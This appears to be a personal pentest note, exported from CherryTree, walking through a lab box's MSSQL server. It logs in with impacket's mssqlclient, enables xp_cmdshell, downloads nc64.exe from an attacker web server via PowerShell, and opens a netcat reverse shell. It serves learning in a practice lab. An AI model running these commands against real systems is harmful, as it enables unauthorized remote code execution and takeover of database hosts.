<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>mssqlclient</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>mssqlclient</h1><br/><p><strong>Microsoft SQL Client</strong></p><p></p><p>impacket-mssqlclient</p><p>or</p><p>python3 mssqlclient.py -h</p><p></p><p><img src="images/153-1.png" alt="images/153-1.png" /></p><p></p><p>python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth </p><p></p><p>Note: Windows Auth Option is used because the Password that was recieved was a windows password rather than MS-SQL password itself.</p><p></p><p><img src="images/153-2.png" alt="images/153-2.png" /></p><p></p><p><img src="images/153-3.png" alt="images/153-3.png" /></p><p></p><p>Here&#39;s two great articles that can guide us further to our exploration journey with MSSQL Server:</p><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p><p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><p></p><p></p><p>SELECT is_srvrolemember(&#39;sysadmin&#39;);</p><p></p><p><img src="images/153-4.png" alt="images/153-4.png" /></p><p></p><p>The output is 1 , which translates to True .</p><p></p><p>First Check if xp_cmdshell is active or not:</p><p></p><p>EXEC xp_cmdshell &#39;net user&#39;;</p><p></p><p><img src="images/153-5.png" alt="images/153-5.png" /></p><p></p><p></p><p>As we see its not activated, we activate by the following commands:</p><p></p><p>EXEC xp_cmdshell &#39;net user&#39;; 									— privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</p><p>EXEC sp_configure &#39;show advanced options&#39;, 1; 		— priv</p><p>RECONFIGURE; 															— priv</p><p>EXEC sp_configure &#39;xp_cmdshell&#39;, 1; 						— priv</p><p>RECONFIGURE; 															— priv</p><p></p><p></p><p><img src="images/153-6.png" alt="images/153-6.png" /></p><p></p><p>After activating we test it.</p><p>xp_cmdshell &quot;whoami&quot;</p><p></p><p><img src="images/153-7.png" alt="images/153-7.png" /></p><p></p><p>xp_cmdshell &quot;powershell -c pwd&quot;</p><p></p><p><img src="images/153-8.png" alt="images/153-8.png" />\</p><p></p><p>Command to make the Target machine download our nc64.exe backdoor:</p><p></p><p>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget <a href="http://{Attacker">http://{Attacker</a>_<a href="http://10.10.14.9/nc64.exe">IP}/nc64.exe</a> -outfile nc64.exe&quot;</p><p></p><p></p><p>Check the interaction in our local webserver:</p><p><img src="images/153-9.png" alt="images/153-9.png" /></p><p></p><p>As we see the Target_IP has downloaded nc64.exe</p><p></p><p>Run the Backdoor</p><p>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {Attacker_IP} {Attacker Listening Port}&quot;</p><p></p><p></p><p>Finally looking back at our netcat listener we can confirm our reverse shell and our foothold to the system:</p><p></p><p><img src="images/153-10.png" alt="images/153-10.png" /></p></div>
</body>
</html>
